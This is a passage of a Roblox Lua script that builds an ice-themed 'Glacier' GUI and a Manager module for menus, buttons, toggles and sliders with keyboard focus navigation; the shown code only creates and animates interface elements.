-- Gui to Lua
-- Version: 3.2

-- Instances:

local GlacierUI = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Header = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UIGradient = Instance.new("UIGradient")
local IceShape1 = Instance.new("Frame")
local IceShape2 = Instance.new("Frame")
local IceShape3 = Instance.new("Frame")
local Logo = Instance.new("TextLabel")
local Title = Instance.new("TextLabel")
local Subtitle = Instance.new("TextLabel")
local BlueLine = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local UIGradient_2 = Instance.new("UIGradient")
local Panel = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local UIGradient_3 = Instance.new("UIGradient")
local Template = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local UIListLayout = Instance.new("UIListLayout")
local BottomBar = Instance.new("Frame")
local UICorner_5 = Instance.new("UICorner")
local UIGradient_4 = Instance.new("UIGradient")
local TextLabel_2 = Instance.new("TextLabel")
local Annc = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")

--Properties:

GlacierUI.Name = "GlacierUI"
GlacierUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
GlacierUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
GlacierUI.ResetOnSpawn = false

Main.Name = "Main"
Main.Parent = GlacierUI
Main.AnchorPoint = Vector2.new(0.5, 0.5)
Main.BackgroundTransparency = 1.000
Main.Position = UDim2.new(0.5, -13, 0.5, 11)
Main.Size = UDim2.new(0, 365, 0, 565)

Header.Name = "Header"
Header.Parent = Main
Header.BackgroundColor3 = Color3.fromRGB(225, 242, 250)
Header.BorderSizePixel = 0
Header.Size = UDim2.new(0, 365, 0, 120)

UICorner.CornerRadius = UDim.new(0, 6)
UICorner.Parent = Header

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(244, 252, 255)), ColorSequenceKeypoint.new(0.50, Color3.fromRGB(209, 239, 250)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(176, 222, 240))}
UIGradient.Rotation = 25
UIGradient.Parent = Header

IceShape1.Name = "IceShape1"
IceShape1.Parent = Header
IceShape1.BackgroundColor3 = Color3.fromRGB(248, 253, 255)
IceShape1.BackgroundTransparency = 0.450
IceShape1.BorderSizePixel = 0
IceShape1.Position = UDim2.new(0, 220, 0, 12)
IceShape1.Rotation = 2.000
IceShape1.Size = UDim2.new(0, 95, 0, 2)

IceShape2.Name = "IceShape2"
IceShape2.Parent = Header
IceShape2.BackgroundColor3 = Color3.fromRGB(248, 253, 255)
IceShape2.BackgroundTransparency = 0.450
IceShape2.BorderSizePixel = 0
IceShape2.Position = UDim2.new(0, 250, 0, 35)
IceShape2.Rotation = -5.000
IceShape2.Size = UDim2.new(0, 80, 0, 2)

IceShape3.Name = "IceShape3"
IceShape3.Parent = Header
IceShape3.BackgroundColor3 = Color3.fromRGB(248, 253, 255)
IceShape3.BackgroundTransparency = 0.450
IceShape3.BorderSizePixel = 0
IceShape3.Position = UDim2.new(0, 290, 0, 20)
IceShape3.Rotation = 3.000
IceShape3.Size = UDim2.new(0, 75, 0, 2)

Logo.Name = "Logo"
Logo.Parent = Header
Logo.BackgroundTransparency = 1.000
Logo.Position = UDim2.new(0, 52, 0, 25)
Logo.Size = UDim2.new(0, 85, 0, 70)
Logo.Font = Enum.Font.GothamBold
Logo.Text = "❄"
Logo.TextColor3 = Color3.fromRGB(35, 145, 205)
Logo.TextSize = 58.000

Title.Name = "Title"
Title.Parent = Header
Title.BackgroundTransparency = 1.000
Title.Position = UDim2.new(0, 142, 0, 27)
Title.Size = UDim2.new(0, 202, 0, 68)
Title.Font = Enum.Font.GothamBold
Title.Text = "Glacier"
Title.TextColor3 = Color3.fromRGB(35, 67, 82)
Title.TextSize = 36.000
Title.TextXAlignment = Enum.TextXAlignment.Left

Subtitle.Name = "Subtitle"
Subtitle.Parent = Header
Subtitle.BackgroundTransparency = 1.000
Subtitle.Position = UDim2.new(0, 146, 0, 70)
Subtitle.Size = UDim2.new(0, 170, 0, 25)
Subtitle.Font = Enum.Font.GothamBold
Subtitle.Text = ""
Subtitle.TextColor3 = Color3.fromRGB(35, 145, 205)
Subtitle.TextSize = 10.000
Subtitle.TextXAlignment = Enum.TextXAlignment.Left

BlueLine.Name = "BlueLine"
BlueLine.Parent = Main
BlueLine.BackgroundColor3 = Color3.fromRGB(72, 178, 225)
BlueLine.BorderSizePixel = 0
BlueLine.Position = UDim2.new(0, 0, 0, 111)
BlueLine.Size = UDim2.new(0, 365, 0, 9)

UICorner_2.CornerRadius = UDim.new(0, 3)
UICorner_2.Parent = BlueLine

UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(35, 145, 205)), ColorSequenceKeypoint.new(0.50, Color3.fromRGB(126, 211, 242)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(35, 145, 205))}
UIGradient_2.Parent = BlueLine

Panel.Name = "Panel"
Panel.Parent = Main
Panel.BackgroundColor3 = Color3.fromRGB(204, 232, 244)
Panel.BorderSizePixel = 0
Panel.Position = UDim2.new(0, 0, 0, 127)
Panel.Size = UDim2.new(0, 365, 0, 392)

UICorner_3.CornerRadius = UDim.new(0, 9)
UICorner_3.Parent = Panel

UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(222, 243, 251)), ColorSequenceKeypoint.new(0.50, Color3.fromRGB(204, 232, 244)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(186, 218, 234))}
UIGradient_3.Rotation = 90
UIGradient_3.Parent = Panel

Template.Name = "Template"
Template.Parent = Panel
Template.BackgroundColor3 = Color3.fromRGB(214, 238, 248)
Template.BackgroundTransparency = 1.000
Template.BorderSizePixel = 0
Template.Size = UDim2.new(0, 360, 0, 37)
Template.AutoButtonColor = false
Template.Text = ""

UICorner_4.CornerRadius = UDim.new(0, 5)
UICorner_4.Parent = Template

TextLabel.Parent = Template
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0, 10, 0, 0)
TextLabel.Size = UDim2.new(0, 350, 0, 37)
TextLabel.Font = Enum.Font.GothamMedium
TextLabel.Text = "template"
TextLabel.TextColor3 = Color3.fromRGB(35, 67, 82)
TextLabel.TextSize = 14.000
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

TextButton.Parent = Template
TextButton.BackgroundTransparency = 1.000
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.Position = UDim2.new(0, 315, 0, 0)
TextButton.Size = UDim2.new(0, 25, 0, 37)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "›"
TextButton.TextColor3 = Color3.fromRGB(35, 145, 205)
TextButton.TextSize = 29.000

UIListLayout.Parent = Panel
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

BottomBar.Name = "BottomBar"
BottomBar.Parent = Main
BottomBar.BackgroundColor3 = Color3.fromRGB(31, 72, 88)
BottomBar.BorderSizePixel = 0
BottomBar.Position = UDim2.new(0, 0, 0, 527)
BottomBar.Size = UDim2.new(0, 365, 0, 38)

UICorner_5.CornerRadius = UDim.new(0, 5)
UICorner_5.Parent = BottomBar

UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(48, 101, 122)), ColorSequenceKeypoint.new(0.50, Color3.fromRGB(31, 72, 88)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(24, 57, 72))}
UIGradient_4.Rotation = 90
UIGradient_4.Parent = BottomBar

TextLabel_2.Parent = BottomBar
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0, 8, 0, 4)
TextLabel_2.Size = UDim2.new(0, 30, 0, 30)
TextLabel_2.Font = Enum.Font.GothamBold
TextLabel_2.Text = "❄"
TextLabel_2.TextColor3 = Color3.fromRGB(248, 253, 255)
TextLabel_2.TextSize = 20.000

Annc.Name = "Annc"
Annc.Parent = BottomBar
Annc.BackgroundTransparency = 1.000
Annc.Position = UDim2.new(0, 38, 0, 0)
Annc.Size = UDim2.new(0, 292, 0, 38)
Annc.Font = Enum.Font.GothamMedium
Annc.Text = "Welcome hellabooter"
Annc.TextColor3 = Color3.fromRGB(248, 253, 255)
Annc.TextSize = 13.000

TextLabel_3.Parent = BottomBar
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0, 330, 0, 4)
TextLabel_3.Size = UDim2.new(0, 30, 0, 30)
TextLabel_3.Font = Enum.Font.GothamBold
TextLabel_3.Text = "❄"
TextLabel_3.TextColor3 = Color3.fromRGB(248, 253, 255)
TextLabel_3.TextSize = 20.000

-- Module Scripts:

local fake_module_scripts = {}

do -- Main.Manager.luau
	local script = Instance.new('ModuleScript', Main)
	script.Name = "Manager.luau"
	local function module_script()
		--!strict
		-- Manager.luau — GlacierUI Manager

		local TweenService          = game:GetService("TweenService")
		local UserInputService      = game:GetService("UserInputService")
		local ContextActionService  = game:GetService("ContextActionService")

		local Manager = {}

		-- =========================================================
		--  THEME
		-- =========================================================
		local THEME = {
			PageBg         = Color3.fromRGB(204, 232, 244),
			PageStroke     = Color3.fromRGB(72, 178, 225),
			PageCorner     = 9,
			PageGradient   = ColorSequence.new{
				ColorSequenceKeypoint.new(0.00, Color3.fromRGB(222, 243, 251)),
				ColorSequenceKeypoint.new(0.50, Color3.fromRGB(204, 232, 244)),
				ColorSequenceKeypoint.new(1.00, Color3.fromRGB(186, 218, 234)),
			},

			ElementBg      = Color3.fromRGB(214, 238, 248),
			ElementBgHover = Color3.fromRGB(228, 245, 253),
			ElementText    = Color3.fromRGB(35, 67, 82),
			AccentText     = Color3.fromRGB(35, 145, 205),
			ElementCorner  = 5,

			FocusStroke    = Color3.fromRGB(72, 178, 225),

			ToggleOn       = Color3.fromRGB(35, 145, 205),
			ToggleOff      = Color3.fromRGB(170, 200, 215),
			ToggleKnob     = Color3.fromRGB(255, 255, 255),

			SliderTrack    = Color3.fromRGB(180, 212, 226),
			SliderFill     = Color3.fromRGB(72, 178, 225),
			SliderKnob     = Color3.fromRGB(255, 255, 255),

			CloseHover     = Color3.fromRGB(220, 60, 60),
			CloseHoverText = Color3.fromRGB(255, 255, 255),
			CloseText      = Color3.fromRGB(0, 0, 0),
		}

		local FONT      = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
		local FONT_BOLD = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold,   Enum.FontStyle.Normal)

		-- =========================================================
		--  STATE
		-- =========================================================
		local window   = script.Parent
		local panel    = window:WaitForChild("Panel")
		local template = panel:WaitForChild("Template") :: GuiObject

		local pagesHolder
		local closeButton
		local menus       = {}
		local currentMenu = nil

		template.Visible = false

		-- Focus state
		local focusList      = {}
		local focusIndex     = 0
		local focusedElement = nil
		local focusStroke    = nil

		local elementActions  = setmetatable({}, { __mode = "k" })
		local elementAdjust   = setmetatable({}, { __mode = "k" })
		local elementSetFocus = setmetatable({}, { __mode = "k" })

		-- =========================================================
		--  HELPERS
		-- =========================================================
		local function new(class, props, parent)
			local i = Instance.new(class)
			for k, v in pairs(props or {}) do i[k] = v end
			if parent then i.Parent = parent end
			return i
		end

		local function tween(inst, t, props)
			TweenService:Create(inst, TweenInfo.new(t, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
		end

		local function addCorner(p, r) return new("UICorner", { CornerRadius = UDim.new(0, r or 5) }, p) end
		local function addStroke(p, c, t) return new("UIStroke", { Color = c, Thickness = t or 1 }, p) end

		local function getLabel(button)
			for _, d in ipairs(button:GetDescendants()) do
				if d:IsA("TextLabel") then return d end
			end
			return nil
		end

		local function getArrow(button)
			for _, d in ipairs(button:GetDescendants()) do
				if d:IsA("TextButton") then return d end
			end
			return nil
		end

		-- =========================================================
		--  FOCUS HIGHLIGHT
		-- =========================================================
		local function clearFocusHighlight()
			if focusedElement then
				local rem = elementSetFocus[focusedElement]
				if rem then rem(false) end
			end
			if focusStroke then
				focusStroke:Destroy()
				focusStroke = nil
			end
			focusedElement = nil
		end

		local function applyFocusHighlight(el)
			clearFocusHighlight()

			if not el or not el.Parent then return end

			focusedElement = el

			local set = elementSetFocus[el]
			if set then set(true) end

			if el:IsA("GuiObject") then
				if focusStroke then focusStroke:Destroy() end
				focusStroke = Instance.new("UIStroke")
				focusStroke.Name = "GlacierFocus"
				focusStroke.Color = THEME.FocusStroke
				focusStroke.Thickness = 2
				focusStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
				focusStroke.Parent = el
			end
		end

		local function setFocus(index)
			if #focusList == 0 then
				focusIndex = 0
				clearFocusHighlight()
				return
			end

			index = math.clamp(index, 1, #focusList)

			if focusedElement == focusList[index] then
				applyFocusHighlight(focusedElement)
				return
			end

			focusIndex = index
			applyFocusHighlight(focusList[index])
		end

		local function moveFocus(delta)
			if #focusList == 0 then return end
			local new = focusIndex + delta
			if new < 1 then new = #focusList end
			if new > #focusList then new = 1 end
			setFocus(new)
		end

		local function activateFocused()
			if not focusedElement then return end
			local action = elementActions[focusedElement]
			if action then
				local ok, err = pcall(action)
				if not ok then warn("[Manager] Focus activate error:", err) end
			end
		end

		local function adjustFocused(dir)
			if not focusedElement then return end
			local adjust = elementAdjust[focusedElement]
			if adjust then
				local ok, err = pcall(adjust, dir)
				if not ok then warn("[Manager] Focus adjust error:", err) end
			end
		end

		-- =========================================================
		--  FOCUS LIST BUILDERS
		-- =========================================================
		local function getPageElements(menuName)
			local data = menus[menuName]
			if not data or not data.page then return {} end

			local list = {}
			for _, child in ipairs(data.page:GetChildren()) do
				if child:IsA("GuiObject") and elementActions[child] then
					table.insert(list, child)
				end
			end
			table.sort(list, function(a, b) return a.LayoutOrder < b.LayoutOrder end)
			return list
		end

		local function rebuildFocusForPage()
			clearFocusHighlight()
			focusList = {}

			if pagesHolder then
				local back = pagesHolder:FindFirstChild("Back")
				if back then table.insert(focusList, back) end
			end

			for _, el in ipairs(getPageElements(currentMenu)) do
				table.insert(focusList, el)
			end

			focusIndex = 0
			setFocus(1)
		end

		local function rebuildFocusForMenu()
			clearFocusHighlight()
			focusList = {}

			local list = {}
			for _, data in pairs(menus) do
				if data.button and data.button.Parent then
					table.insert(list, data.button)
				end
			end
			table.sort(list, function(a, b) return a.LayoutOrder < b.LayoutOrder end)

			for _, el in ipairs(list) do
				table.insert(focusList, el)
			end

			if closeButton then
				table.insert(focusList, closeButton)
			end

			focusIndex = 0
			setFocus(1)
		end

		-- =========================================================
		--  KEY BINDINGS
		-- =========================================================
		local KEYBOUND = false

		local function bindKeys()
			if KEYBOUND then return end
			KEYBOUND = true

			ContextActionService:BindAction("GlacierFocusUp", function(_, state)
				if state ~= Enum.UserInputState.Begin then return Enum.ContextActionResult.Pass end
				moveFocus(-1)
				return Enum.ContextActionResult.Sink
			end, false, Enum.KeyCode.Up)

			ContextActionService:BindAction("GlacierFocusDown", function(_, state)
				if state ~= Enum.UserInputState.Begin then return Enum.ContextActionResult.Pass end
				moveFocus(1)
				return Enum.ContextActionResult.Sink
			end, false, Enum.KeyCode.Down)

			ContextActionService:BindAction("GlacierFocusLeft", function(_, state)
				if state ~= Enum.UserInputState.Begin then return Enum.ContextActionResult.Pass end
				adjustFocused(-1)
				return Enum.ContextActionResult.Sink
			end, false, Enum.KeyCode.Left)

			ContextActionService:BindAction("GlacierFocusRight", function(_, state)
				if state ~= Enum.UserInputState.Begin then return Enum.ContextActionResult.Pass end
				adjustFocused(1)
				return Enum.ContextActionResult.Sink
			end, false, Enum.KeyCode.Right)

			ContextActionService:BindAction("GlacierFocusEnter", function(_, state)
				if state ~= Enum.UserInputState.Begin then return Enum.ContextActionResult.Pass end
				activateFocused()
				return Enum.ContextActionResult.Sink
			end, false, Enum.KeyCode.Return, Enum.KeyCode.KeypadEnter)

			-- ⬅ Backspace → return to main menu
			ContextActionService:BindAction("GlacierBack", function(_, state)
				if state ~= Enum.UserInputState.Begin then return Enum.ContextActionResult.Pass end
				if currentMenu then
					Manager:CloseMenu()
					return Enum.ContextActionResult.Sink
				end
				return Enum.ContextActionResult.Pass
			end, false, Enum.KeyCode.Backspace)
		end

		-- =========================================================
		--  PAGE CONTAINER
		-- =========================================================
		local function ensurePagesHolder()
			if pagesHolder and pagesHolder.Parent then return pagesHolder end

			pagesHolder = new("Frame", {
				Name             = "Pages",
				Size             = panel.Size,
				Position         = panel.Position,
				BackgroundColor3 = THEME.PageBg,
				BorderSizePixel  = 0,
				Visible          = false,
				ZIndex           = 3,
				Active           = true,
			}, window)

			addCorner(pagesHolder, THEME.PageCorner)
			new("UIGradient", { Rotation = 90, Color = THEME.PageGradient }, pagesHolder)
			addStroke(pagesHolder, THEME.PageStroke, 2)

			local back = new("TextButton", {
				Name             = "Back",
				Size             = UDim2.new(0, 26, 0, 26),
				Position         = UDim2.new(0, 10, 0, 10),
				AnchorPoint      = Vector2.new(0, 0),
				BackgroundColor3 = THEME.ElementBg,
				BorderSizePixel  = 0,
				Text             = "‹",
				TextSize         = 22,
				TextColor3       = THEME.AccentText,
				FontFace         = FONT_BOLD,
				AutoButtonColor  = false,
				ZIndex           = 20,
			}, pagesHolder)
			addCorner(back, 5)
			back.MouseButton1Click:Connect(function() Manager:CloseMenu() end)

			back.MouseEnter:Connect(function()
				tween(back, 0.15, { BackgroundColor3 = THEME.ElementBgHover })
			end)
			back.MouseLeave:Connect(function()
				if focusedElement ~= back then
					tween(back, 0.15, { BackgroundColor3 = THEME.ElementBg })
				end
			end)

			elementActions[back] = function() Manager:CloseMenu() end
			elementSetFocus[back] = function(state)
				tween(back, 0.1, { BackgroundColor3 = state and THEME.ElementBgHover or THEME.ElementBg })
			end

			return pagesHolder
		end

		local function clearAllHover()
			for _, data in pairs(menus) do
				local btn = data.button
				if btn and btn ~= focusedElement then
					tween(btn, 0.15, { BackgroundTransparency = 1 })
				end
			end
		end

		-- =========================================================
		--  FADE-OUT
		-- =========================================================
		local function fadeOutWindow(duration)
			duration = duration or 0.4

			local targets = {}
			for _, obj in ipairs(window:GetDescendants()) do
				if obj ~= template and obj:IsA("GuiObject") then
					local props = {}
					if pcall(function() return obj.BackgroundTransparency end) then
						props.BackgroundTransparency = 1
					end
					if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
						props.TextTransparency = 1
					end
					if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
						props.ImageTransparency = 1
					end
					if obj:IsA("UIStroke") then
						props.Transparency = 1
					end
					if next(props) then
						table.insert(targets, { obj = obj, props = props })
					end
				end
			end

			local originals = {}
			for _, t in ipairs(targets) do
				local orig = {}
				for k in pairs(t.props) do
					orig[k] = t.obj[k]
				end
				originals[t.obj] = orig
			end

			for _, t in ipairs(targets) do
				TweenService:Create(
					t.obj,
					TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
					t.props
				):Play()
			end

			task.wait(duration)
			window.Visible = false

			for obj, orig in pairs(originals) do
				for k, v in pairs(orig) do
					pcall(function() obj[k] = v end)
				end
			end
		end

		-- =========================================================
		--  PAGE
		-- =========================================================
		local function createPage(name)
			if menus[name] then return menus[name].page end

			local page = new("ScrollingFrame", {
				Name                   = name .. "_Page",
				Size                   = UDim2.new(1, -20, 1, -60),
				Position               = UDim2.new(0.5, 0, 0.5, 20),
				AnchorPoint            = Vector2.new(0.5, 0.5),
				BackgroundTransparency = 1,
				BorderSizePixel        = 0,
				ScrollingEnabled       = true,
				ScrollBarThickness     = 4,
				ScrollBarImageColor3   = THEME.PageStroke,
				CanvasSize             = UDim2.new(0, 0, 0, 0),
				AutomaticCanvasSize    = Enum.AutomaticSize.Y,
				Visible                = false,
				ZIndex                 = 4,
			}, ensurePagesHolder())

			new("UIListLayout", {
				Padding   = UDim.new(0, 6),
				SortOrder = Enum.SortOrder.LayoutOrder,
			}, page)

			new("UIPadding", {
				PaddingTop    = UDim.new(0, 6),
				PaddingBottom = UDim.new(0, 6),
			}, page)

			menus[name] = { page = page, button = nil, order = 0 }
			return page
		end

		-- =========================================================
		--  MENU CONTROLS
		-- =========================================================
		function Manager:SelectMenu(name)
			local m = menus[name]; if not m then return end
			ensurePagesHolder()

			for menuName, data in pairs(menus) do
				if data.page then
					data.page.Visible = (menuName == name)
				end
				if data.button then
					data.button.Active = false
					local arrow = getArrow(data.button)
					if arrow then arrow.Active = false end
				end
			end

			pagesHolder.Visible = true
			currentMenu = name
			clearAllHover()

			if closeButton then closeButton.Visible = false end

			rebuildFocusForPage()
		end

		function Manager:CloseMenu()
			ensurePagesHolder()

			for _, data in pairs(menus) do
				if data.page then
					data.page.Visible = false
				end
				if data.button then
					data.button.Active = true
					local arrow = getArrow(data.button)
					if arrow then arrow.Active = true end
				end
			end

			pagesHolder.Visible = false
			currentMenu = nil
			clearAllHover()

			if closeButton then closeButton.Visible = true end

			rebuildFocusForMenu()
		end

		-- =========================================================
		--  MENU (clone Template)
		-- =========================================================
		function Manager:CreateMenu(menuName)
			if menus[menuName] then return menus[menuName].button end

			local btn = template:Clone() :: GuiObject
			btn.Name                   = menuName
			btn.Visible                = true
			btn.LayoutOrder            = #panel:GetChildren()
			btn.BackgroundTransparency = 1
			btn.ZIndex                 = 2

			local label = getLabel(btn)
			if label then label.Text = menuName end

			local function toggle()
				if currentMenu then
					if currentMenu == menuName then Manager:CloseMenu() end
					return
				end
				Manager:SelectMenu(menuName)
			end

			btn.Active = true
			btn.MouseButton1Click:Connect(toggle)

			local arrow = getArrow(btn)
			if arrow then
				arrow.Active = true
				arrow.BackgroundTransparency = 1
				arrow.MouseButton1Click:Connect(toggle)
			end

			btn.MouseEnter:Connect(function()
				if currentMenu then return end
				if focusedElement == btn then return end
				tween(btn, 0.15, { BackgroundColor3 = THEME.ElementBg, BackgroundTransparency = 0 })
			end)
			btn.MouseLeave:Connect(function()
				if currentMenu then return end
				if focusedElement == btn then return end
				tween(btn, 0.15, { BackgroundTransparency = 1 })
			end)

			elementActions[btn] = toggle
			elementSetFocus[btn] = function(state)
				if state then
					tween(btn, 0.1, { BackgroundColor3 = THEME.ElementBg, BackgroundTransparency = 0 })
				else
					tween(btn, 0.1, { BackgroundTransparency = 1 })
				end
			end

			btn.Parent = panel
			createPage(menuName)
			menus[menuName].button = btn

			return btn
		end

		function Manager:CreateMenus(list)
			for _, name in ipairs(list) do
				Manager:CreateMenu(name)
			end
		end

		-- =========================================================
		--  BASE ELEMENT
		-- =========================================================
		local function nextOrder(menuName)
			local m = menus[menuName]; if not m then return 0 end
			m.order += 1
			return m.order
		end

		local function baseElement(menuName, height, className)
			if not menus[menuName] then createPage(menuName) end

			local el = new(className or "Frame", {
				Name                   = "Element",
				Size                   = UDim2.new(1, 0, 0, height),
				BackgroundColor3       = THEME.ElementBg,
				BackgroundTransparency = 0,
				BorderSizePixel        = 0,
				LayoutOrder            = nextOrder(menuName),
				ZIndex                 = 5,
			}, menus[menuName].page)
			addCorner(el, THEME.ElementCorner)
			return el
		end

		-- =========================================================
		--  BUTTON
		-- =========================================================
		function Manager:CreateButton(opts)
			local el = baseElement(opts.Menu or "Main", 37, "TextButton")
			el.Text = ""
			el.AutoButtonColor = false

			new("TextLabel", {
				Name = "Title",
				Size = UDim2.new(1, -20, 1, 0),
				Position = UDim2.new(0, 10, 0, 0),
				BackgroundTransparency = 1,
				Text = opts.Name or "Button",
				TextXAlignment = Enum.TextXAlignment.Left,
				TextSize = 14,
				TextColor3 = THEME.ElementText,
				FontFace = FONT,
				ZIndex = 6,
			}, el)

			el.MouseEnter:Connect(function()
				if focusedElement == el then return end
				tween(el, 0.15, { BackgroundColor3 = THEME.ElementBgHover })
			end)
			el.MouseLeave:Connect(function()
				if focusedElement == el then return end
				tween(el, 0.15, { BackgroundColor3 = THEME.ElementBg })
			end)

			el.MouseButton1Click:Connect(function()
				if opts.Callback then
					local ok, err = pcall(opts.Callback)
					if not ok then warn("[Manager] Button error:", err) end
				end
			end)

			elementActions[el] = function()
				if opts.Callback then
					local ok, err = pcall(opts.Callback)
					if not ok then warn("[Manager] Button error:", err) end
				end
			end
			elementSetFocus[el] = function(state)
				tween(el, 0.1, { BackgroundColor3 = state and THEME.ElementBgHover or THEME.ElementBg })
			end

			return el
		end

		-- =========================================================
		--  TOGGLE
		-- =========================================================
		function Manager:CreateToggle(opts)
			local el = baseElement(opts.Menu or "Main", 37, "TextButton")
			el.Text = ""
			el.AutoButtonColor = false
			el.Active = true

			local state = opts.Default == true

			new("TextLabel", {
				Name = "Title",
				Size = UDim2.new(1, -80, 1, 0),
				Position = UDim2.new(0, 10, 0, 0),
				BackgroundTransparency = 1,
				Text = opts.Name or "Toggle",
				TextXAlignment = Enum.TextXAlignment.Left,
				TextSize = 14,
				TextColor3 = THEME.ElementText,
				FontFace = FONT,
				ZIndex = 6,
			}, el)

			local switch = new("TextButton", {
				Name = "Switch",
				Size = UDim2.new(0, 40, 0, 20),
				Position = UDim2.new(1, -50, 0.5, 0),
				AnchorPoint = Vector2.new(0, 0.5),
				BackgroundColor3 = state and THEME.ToggleOn or THEME.ToggleOff,
				BorderSizePixel = 0,
				Text = "",
				AutoButtonColor = false,
				ZIndex = 6,
			}, el)
			addCorner(switch, 10)

			local knob = new("Frame", {
				Name = "Knob",
				Size = UDim2.new(0, 16, 0, 16),
				Position = state and UDim2.new(1, -18, 0.5, 0) or UDim2.new(0, 2, 0.5, 0),
				AnchorPoint = Vector2.new(0, 0.5),
				BackgroundColor3 = THEME.ToggleKnob,
				BorderSizePixel = 0,
				ZIndex = 7,
			}, switch)
			addCorner(knob, 8)

			local function apply(v, animate)
				state = v
				local col = v and THEME.ToggleOn or THEME.ToggleOff
				local pos = v and UDim2.new(1, -18, 0.5, 0) or UDim2.new(0, 2, 0.5, 0)
				if animate then
					tween(switch, 0.15, { BackgroundColor3 = col })
					tween(knob,   0.15, { Position = pos })
				else
					switch.BackgroundColor3 = col
					knob.Position = pos
				end
			end

			local function fire()
				apply(not state, true)
				if opts.Callback then
					local ok, err = pcall(opts.Callback, state)
					if not ok then warn("[Manager] Toggle error:", err) end
				end
			end

			switch.MouseButton1Click:Connect(fire)

			el.MouseEnter:Connect(function()
				if focusedElement == el then return end
				tween(el, 0.15, { BackgroundColor3 = THEME.ElementBgHover })
			end)
			el.MouseLeave:Connect(function()
				if focusedElement == el then return end
				tween(el, 0.15, { BackgroundColor3 = THEME.ElementBg })
			end)

			elementActions[el] = fire
			elementSetFocus[el] = function(s)
				tween(el, 0.1, { BackgroundColor3 = s and THEME.ElementBgHover or THEME.ElementBg })
			end

			return {
				Set = function(_, v) apply(v, false) end,
				Get = function() return state end,
				Instance = el,
			}
		end

		-- =========================================================
		--  SLIDER
		-- =========================================================
		function Manager:CreateSlider(opts)
			local el = baseElement(opts.Menu or "Main", 52, "TextButton")
			el.Text = ""
			el.AutoButtonColor = false
			el.Active = true

			local min     = opts.Min or 0
			local max     = opts.Max or 100
			local inc     = opts.Increment or 1
			local value   = opts.Default or min
			local suffix  = opts.Suffix or ""

			new("TextLabel", {
				Name = "Title",
				Size = UDim2.new(1, -100, 0, 18),
				Position = UDim2.new(0, 10, 0, 4),
				BackgroundTransparency = 1,
				Text = opts.Name or "Slider",
				TextXAlignment = Enum.TextXAlignment.Left,
				TextSize = 13,
				TextColor3 = THEME.ElementText,
				FontFace = FONT,
				ZIndex = 6,
			}, el)

			local valueLabel = new("TextLabel", {
				Name = "Value",
				Size = UDim2.new(0, 80, 0, 18),
				Position = UDim2.new(1, -90, 0, 4),
				BackgroundTransparency = 1,
				Text = tostring(value) .. suffix,
				TextXAlignment = Enum.TextXAlignment.Right,
				TextSize = 13,
				TextColor3 = THEME.AccentText,
				FontFace = FONT_BOLD,
				ZIndex = 6,
			}, el)

			local track = new("Frame", {
				Name = "Track",
				Size = UDim2.new(1, -20, 0, 6),
				Position = UDim2.new(0, 10, 1, -16),
				BackgroundColor3 = THEME.SliderTrack,
				BorderSizePixel = 0,
				ZIndex = 6,
			}, el)
			addCorner(track, 3)

			local fill = new("Frame", {
				Name = "Fill",
				Size = UDim2.new((value - min) / (max - min), 0, 1, 0),
				BackgroundColor3 = THEME.SliderFill,
				BorderSizePixel = 0,
				ZIndex = 7,
			}, track)
			addCorner(fill, 3)

			local knob = new("Frame", {
				Name = "Knob",
				Size = UDim2.new(0, 14, 0, 14),
				Position = UDim2.new((value - min) / (max - min), 0, 0.5, 0),
				AnchorPoint = Vector2.new(0.5, 0.5),
				BackgroundColor3 = THEME.SliderKnob,
				BorderSizePixel = 0,
				ZIndex = 8,
			}, track)
			addCorner(knob, 7)
			addStroke(knob, THEME.SliderFill, 1)

			local dragging = false
			local page = el.Parent

			local function setValue(v, fire)
				v = math.clamp(v, min, max)
				if v == value and fire then return end
				value = v
				local rel = (value - min) / (max - min)
				fill.Size = UDim2.new(rel, 0, 1, 0)
				knob.Position = UDim2.new(rel, 0, 0.5, 0)
				valueLabel.Text = tostring(value) .. suffix
				if fire and opts.Callback then
					local ok, err = pcall(opts.Callback, value)
					if not ok then warn("[Manager] Slider error:", err) end
				end
			end

			local function setFromX(x)
				local rel = math.clamp((x - track.AbsolutePosition.X) / math.max(track.AbsoluteSize.X, 1), 0, 1)
				local nv = math.floor((min + rel * (max - min)) / inc + 0.5) * inc
				setValue(nv, true)
			end

			el.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1
					or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					if page and page:IsA("ScrollingFrame") then
						page.ScrollingEnabled = false
					end
					setFromX(input.Position.X)
				end
			end)

